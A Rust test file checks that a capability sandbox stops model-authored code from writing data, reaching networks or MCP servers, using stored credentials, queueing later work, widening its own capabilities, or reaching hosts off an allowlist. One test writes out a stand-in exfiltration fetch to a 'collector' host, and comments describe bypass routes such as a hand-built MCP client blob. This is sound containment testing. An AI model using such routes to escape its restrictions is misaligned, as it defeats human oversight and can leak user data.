//! A script running part of its own work with fewer capabilities than it holds.
//!
//! The unit under test is the boundary rather than the plumbing: what these
//! assert is that a narrowed sub-execution *cannot* do the thing it was
//! narrowed out of, at the gate underneath the JavaScript rather than in
//! anything the running code could talk its way past. `src/sandbox.rs` covers
//! the narrowing arithmetic; these run real code in a real sub-execution and
//! check that the refusal arrives.
//!
//! The shape they describe is the one item 1 of `TODO-agent.md` asked for:
//!
//!   - model-authored code evaluated holding a chosen subset, and
//!   - a plan mode that is enforced rather than offered — a turn that may read
//!     everything and write nothing, with no arrangement of the transcript
//!     reaching past it.

mod common;

use common::{setup_env, test_mutex};

use aiwebengine::repository;
use aiwebengine::script_eval::{EvalReport, EvalRequest, eval_blocking};
use aiwebengine::security::UserContext;
use serde_json::{Value, json};

/// The outer turn: an administrator running against a script that does
/// nothing itself. Everything interesting happens in the sub-execution the
/// source starts, so the outer context is deliberately the widest one there
/// is — a narrowing that only worked from an already-narrow caller would
/// prove nothing.
async fn outer(uri: &str, source: &str) -> EvalReport {
    repository::upsert_script(uri, "function init() {}").expect("script should be stored");
    let request = EvalRequest {
        timeout_ms: Some(15_000),
        rollback: false,
        // A person, because half of what a narrowed turn has to carry
        // through is who it is acting as, and an evaluation with no auth
        // context could not tell a carried identity from an absent one.
        auth_context: Some(aiwebengine::auth::JsAuthContext::authenticated(
            "attenuation".to_string(),
            Some("someone@example.test".to_string()),
            Some("Someone".to_string()),
            "internal".to_string(),
            true,
            true,
        )),
        ..EvalRequest::new(
            uri.to_string(),
            source.to_string(),
            UserContext::admin("attenuation".to_string()),
        )
    };
    tokio::task::spawn_blocking(move || eval_blocking(request))
        .await
        .expect("evaluation panicked")
}

/// The value the outer turn produced.
async fn value(uri: &str, source: &str) -> Value {
    let report = outer(uri, source).await;
    assert!(report.ok, "outer turn failed: {:?}", report.outcome.error);
    report
        .outcome
        .value
        .expect("the outer turn produced a value")
}

/// A sub-execution that was given nothing still computes, because computing
/// is not a capability. This is the base case the rest subtract from — and
/// the reason the primitive is worth having at all: model-authored code can
/// be run with no authority whatsoever and still answer.
#[tokio::test(flavor = "multi_thread")]
async fn code_runs_with_no_capabilities_at_all() {
    let _guard = test_mutex().lock().await;
    setup_env().await;

    let out = value(
        "test://attenuation/compute",
        r#"
        const run = sandbox.run("context.args.a + context.args.b", {
            capabilities: [],
            input: { a: 2, b: 40 },
        });
        ({ value: run.value, error: run.error })
        "#,
    )
    .await;

    assert_eq!(out["value"], json!(42));
    assert_eq!(out["error"], Value::Null);
}

/// The plan-mode case, and the one that was inexpressible before
/// `UseScriptDatabase` was split: a turn that reads a table and cannot write
/// it. Both halves are asserted in one sub-execution, because "the read
/// worked" is what makes "the write was refused" mean something other than
/// "nothing worked".
#[tokio::test(flavor = "multi_thread")]
async fn a_planning_turn_reads_and_cannot_write() {
    let _guard = test_mutex().lock().await;
    setup_env().await;

    let out = value(
        "test://attenuation/plan",
        r#"
        database.ensureTable("notes", JSON.stringify({
            columns: [{ name: "body", type: "text" }],
        }));
        database.insert("notes", JSON.stringify({ body: "before" }));

        const run = sandbox.run(`
            const rows = database.query("notes").json();
            // The database answers with an envelope rather than throwing, so
            // a refusal is read rather than caught.
            const write = database.insert("notes", JSON.stringify({ body: "during" })).json();
            ({ read: rows.length, refused: write.error || null });
        `, { capabilities: ["read_script_data"] });

        ({
            value: run.value,
            error: run.error,
            after: database.query("notes").json().length,
        })
        "#,
    )
    .await;

    assert_eq!(out["error"], Value::Null, "the planning turn should run");
    assert_eq!(out["value"]["read"], json!(1), "the read must work");
    assert!(
        out["value"]["refused"]
            .as_str()
            .unwrap_or_default()
            .contains("write_script_data"),
        "the write should name the capability it wanted: {}",
        out["value"]["refused"]
    );
    assert_eq!(
        out["after"],
        json!(1),
        "the refused write must not have landed"
    );
}

/// `fetch` was gated by nothing at all before this, which made every other
/// restriction decorative: code that could call out could spend tokens, post
/// anywhere, and carry whatever it had been shown with it.
#[tokio::test(flavor = "multi_thread")]
async fn a_narrowed_turn_cannot_reach_the_network() {
    let _guard = test_mutex().lock().await;
    setup_env().await;

    let out = value(
        "test://attenuation/network",
        r#"
        const run = sandbox.run(`
            try {
                fetch("https://example.com");
                "not refused";
            } catch (e) {
                String(e.message || e);
            }
        `, { capabilities: ["read_script_data"] });
        run.value
        "#,
    )
    .await;

    assert!(
        out.as_str().unwrap_or_default().contains("use_network"),
        "fetch should be refused by name: {}",
        out
    );
}

/// `fetch` is not the only way out, and the other one used to be ungated.
///
/// `McpClient` opens an outbound request to a caller-named URL carrying a
/// secret resolved host-side, and it was installed into every context without
/// consulting the capability set at all — so a narrowing that took away
/// `use_network` and `read_secrets` took away neither on this path.
///
/// The call under test is `_callTool` **directly**, with a hand-written client
/// blob, because that is the shape a check sitting only on the constructor
/// would miss: `constructor` returns JSON and the methods rebuild the client
/// from whatever JSON they are given, so the bypass is one string literal.
#[tokio::test(flavor = "multi_thread")]
async fn a_narrowed_turn_cannot_reach_an_mcp_server() {
    let _guard = test_mutex().lock().await;
    setup_env().await;

    let out = value(
        "test://attenuation/mcp",
        r#"
        const run = sandbox.run(`
            try {
                McpClient._callTool(
                    JSON.stringify({
                        serverUrl: "https://example.com/mcp",
                        secretIdentifier: "anthropic_key"
                    }),
                    "anything",
                    "{}"
                );
                "not refused";
            } catch (e) {
                String(e.message || e);
            }
        `, { capabilities: ["read_script_data"] });
        run.value
        "#,
    )
    .await;

    assert!(
        out.as_str().unwrap_or_default().contains("use_network"),
        "calling an MCP tool should be refused by name: {}",
        out
    );
}

/// Holding the network is not enough, because the credential is not optional.
///
/// This is where `McpClient` differs from `fetch`, which refuses on
/// `read_secrets` only when the request actually names a secret. Every MCP
/// call resolves `secretIdentifier` and sends it as a `Bearer` token — there is
/// no unauthenticated arm — so a turn that may call out but may not spend the
/// person's credentials may not make one.
#[tokio::test(flavor = "multi_thread")]
async fn reaching_an_mcp_server_takes_the_credential_too() {
    let _guard = test_mutex().lock().await;
    setup_env().await;

    let out = value(
        "test://attenuation/mcp-secret",
        r#"
        const run = sandbox.run(`
            try {
                McpClient.constructor("https://example.com/mcp", "anthropic_key");
                "not refused";
            } catch (e) {
                String(e.message || e);
            }
        `, { capabilities: ["use_network"] });
        run.value
        "#,
    )
    .await;

    assert!(
        out.as_str().unwrap_or_default().contains("read_secrets"),
        "an MCP client should be refused for the credential: {}",
        out
    );
}

/// Queueing is how an execution outlives itself. A turn that may not write
/// now must not be able to arrange a write for later, since the task runs in
/// script context holding what the script holds rather than what this turn
/// was narrowed to.
#[tokio::test(flavor = "multi_thread")]
async fn a_narrowed_turn_cannot_queue_work_for_later() {
    let _guard = test_mutex().lock().await;
    setup_env().await;

    let out = value(
        "test://attenuation/queue",
        r#"
        const run = sandbox.run(`
            try {
                scriptTasks.enqueue({ handler: "later", payload: {} });
                "not refused";
            } catch (e) {
                String(e.message || e);
            }
        `, { capabilities: ["read_script_data"] });
        run.value
        "#,
    )
    .await;

    assert!(
        out.as_str().unwrap_or_default().contains("enqueue_tasks"),
        "enqueueing should be refused by name: {}",
        out
    );
}

/// Asking for more than the caller holds is refused where it was asked,
/// rather than becoming a puzzling refusal from inside the sub-execution.
/// A request-level mistake throws; only what the *code* did comes back as a
/// value.
#[tokio::test(flavor = "multi_thread")]
async fn asking_for_more_than_the_caller_holds_throws_at_the_call() {
    let _guard = test_mutex().lock().await;
    setup_env().await;

    let out = value(
        "test://attenuation/refused",
        r#"
        const answers = [];
        // Narrow once, then try to climb back out from inside.
        const run = sandbox.run(`
            try {
                sandbox.run("1", { capabilities: ["write_script_data"] });
                "not refused";
            } catch (e) {
                String(e.message || e);
            }
        `, { capabilities: ["read_script_data"] });
        answers.push(run.value);

        // And a name the engine does not have is a mistake, not a narrowing.
        try {
            sandbox.run("1", { capabilities: ["read_only"] });
            answers.push("not refused");
        } catch (e) {
            answers.push(String(e.message || e));
        }
        answers
        "#,
    )
    .await;

    let inner = out[0].as_str().unwrap_or_default();
    assert!(
        inner.contains("write_script_data") && inner.contains("does not hold"),
        "a narrowed turn must not be able to widen itself: {}",
        inner
    );
    assert!(
        out[1]
            .as_str()
            .unwrap_or_default()
            .contains("not a capability"),
        "an unknown name should be refused as one: {}",
        out[1]
    );
}

/// The sub-execution's own output comes back whether it succeeded or not.
/// For an agent this is usually the most useful part of a failed turn: the
/// model's code printed its reasoning and then threw, and both halves are
/// what goes back into the next prompt.
#[tokio::test(flavor = "multi_thread")]
async fn console_and_failures_both_come_back_as_values() {
    let _guard = test_mutex().lock().await;
    setup_env().await;

    let out = value(
        "test://attenuation/output",
        r#"
        const run = sandbox.run(`
            console.log("thinking out loud");
            throw new Error("did not work");
        `, { capabilities: [] });
        ({
            error: run.error,
            printed: run.console.map(line => line.message),
        })
        "#,
    )
    .await;

    assert!(
        out["error"]
            .as_str()
            .unwrap_or_default()
            .contains("did not work"),
        "a throw inside should be reported rather than thrown out: {}",
        out["error"]
    );
    assert!(
        out["printed"]
            .as_array()
            .map(|lines| lines.iter().any(|line| line
                .as_str()
                .unwrap_or_default()
                .contains("thinking out loud")))
            .unwrap_or(false),
        "console output should survive the failure: {}",
        out["printed"]
    );
}

/// Nesting is bounded. Each level is a live runtime and a stack frame, and
/// the shared budget bounds how *long* a chain runs without bounding how
/// deep it goes.
#[tokio::test(flavor = "multi_thread")]
async fn nesting_is_bounded() {
    let _guard = test_mutex().lock().await;
    setup_env().await;

    let out = value(
        "test://attenuation/depth",
        r#"
        // Each level runs the same source one level down, so the chain ends
        // at the depth limit rather than at anything the script counted.
        const recurse = `
            try {
                const inner = sandbox.run(context.args.source, {
                    capabilities: [],
                    input: { source: context.args.source },
                });
                inner.value === undefined ? "ran" : inner.value;
            } catch (e) {
                String(e.message || e);
            }
        `;
        const run = sandbox.run(recurse, {
            capabilities: [],
            input: { source: recurse },
        });
        run.value
        "#,
    )
    .await;

    assert!(
        out.as_str().unwrap_or_default().contains("limit"),
        "a chain of sub-executions should bottom out: {}",
        out
    );
}

/// The identity carries through. Attenuation says what may be done, not who
/// is doing it — a narrowed turn that changed identity would silently move a
/// script's reads and writes into a different person's rows.
#[tokio::test(flavor = "multi_thread")]
async fn the_person_carries_into_the_sub_execution() {
    let _guard = test_mutex().lock().await;
    setup_env().await;

    let out = value(
        "test://attenuation/identity",
        r#"
        const run = sandbox.run(
            "context.request.auth.userId",
            { capabilities: [] },
        );
        ({ inner: run.value, outer: context.request.auth.userId })
        "#,
    )
    .await;

    assert_eq!(
        out["inner"], out["outer"],
        "the sub-execution runs as the same person: {}",
        out
    );
}

/// The destination dimension: where a narrowed turn may go, not just what it
/// may do.
///
/// `use_network` names the verb and nothing else, so "may call the network"
/// meant "may call anything" — and that is the gap a capability set cannot
/// close on its own, because **exfiltration needs no write capability**. A
/// planning turn holding only reads could put everything it read into a URL.
#[tokio::test(flavor = "multi_thread")]
async fn a_narrowed_turn_can_be_bounded_to_named_hosts() {
    let _guard = test_mutex().lock().await;
    setup_env().await;

    let out = value(
        "test://attenuation/hosts",
        r#"
        const run = sandbox.run(`
            try {
                fetch("https://collector.example.test/steal?note=secret");
                "not refused";
            } catch (e) {
                String(e.message || e);
            }
        `, { capabilities: ["use_network"], hosts: ["api.example.test"] });
        run.value
        "#,
    )
    .await;

    let message = out.as_str().unwrap_or_default();
    assert!(
        message.contains("may not reach") && message.contains("collector.example.test"),
        "a host outside the scope should be refused by name: {}",
        out
    );
    assert!(
        message.contains("api.example.test"),
        "the refusal should say what is allowed, since the caller wrote the list: {}",
        out
    );
}

/// Asking to reach somewhere the caller cannot is refused at the call.
///
/// The destination counterpart of `asking_for_more_than_the_caller_holds`, and
/// refused for the same reason: a sub-execution whose requests mysteriously
/// fail is the worse of the two ways to report a bug in the narrowing.
#[tokio::test(flavor = "multi_thread")]
async fn a_narrowing_cannot_widen_where_it_may_go() {
    let _guard = test_mutex().lock().await;
    setup_env().await;

    let report = outer(
        "test://attenuation/hosts-widen",
        r#"
        const inner = sandbox.run(`
            sandbox.run("1", { capabilities: ["use_network"], hosts: ["elsewhere.example.test"] });
        `, { capabilities: ["use_network"], hosts: ["api.example.test"] });
        inner.error || "no error";
        "#,
    )
    .await;

    let value = report.outcome.value.unwrap_or_default();
    let message = value.as_str().unwrap_or_default();
    assert!(
        message.contains("cannot reach") && message.contains("elsewhere.example.test"),
        "a nested narrowing must not reach past its parent's scope: {}",
        value
    );
}

/// A wildcard covers subdomains and not the bare parent.
///
/// The rule CSP and CORS use. A list that said `*.example.test` and quietly
/// also permitted `example.test` would be one that does not say what it looks
/// like it says.
#[tokio::test(flavor = "multi_thread")]
async fn a_wildcard_covers_subdomains_and_not_the_parent() {
    let _guard = test_mutex().lock().await;
    setup_env().await;

    let out = value(
        "test://attenuation/hosts-wildcard",
        r#"
        function attempt(url) {
            const run = sandbox.run(
                'try { fetch(' + JSON.stringify(url) + '); "reached"; } ' +
                'catch (e) { String(e.message || e); }',
                { capabilities: ["use_network"], hosts: ["*.example.test"] }
            );
            return run.value;
        }
        ({
            sub: attempt("https://api.example.test/x"),
            parent: attempt("https://example.test/x"),
            other: attempt("https://example.test.evil.test/x"),
        })
        "#,
    )
    .await;

    // The subdomain is permitted, so it gets as far as the network and fails
    // there — what matters is that it is not the scope that refused it.
    assert!(
        !out["sub"]
            .as_str()
            .unwrap_or_default()
            .contains("may not reach"),
        "a subdomain should pass the scope: {}",
        out
    );
    assert!(
        out["parent"]
            .as_str()
            .unwrap_or_default()
            .contains("may not reach"),
        "a wildcard must not admit the bare parent: {}",
        out
    );
    assert!(
        out["other"]
            .as_str()
            .unwrap_or_default()
            .contains("may not reach"),
        "a suffix that is not a subdomain must not pass: {}",
        out
    );
}

/// `sandbox.hosts()` answers `null` for unrestricted and a list otherwise.
///
/// The distinction is load-bearing: an empty array is a real answer — a turn
/// that may reach nothing — so conflating it with "anywhere" would make
/// `sandbox.hosts() || []` quietly open the network back up.
#[tokio::test(flavor = "multi_thread")]
async fn a_turn_can_read_where_it_may_go() {
    let _guard = test_mutex().lock().await;
    setup_env().await;

    let out = value(
        "test://attenuation/hosts-read",
        r#"
        const bounded = sandbox.run(
            "JSON.stringify(sandbox.hosts())",
            { capabilities: ["use_network"], hosts: ["api.example.test"] }
        );
        ({ outer: sandbox.hosts(), inner: bounded.value })
        "#,
    )
    .await;

    assert!(
        out["outer"].is_null(),
        "an ordinary turn reaches anywhere, which is null rather than []: {}",
        out
    );
    assert_eq!(
        out["inner"].as_str().unwrap_or_default(),
        r#"["api.example.test"]"#,
        "a bounded turn should be able to read its own scope: {}",
        out
    );
}
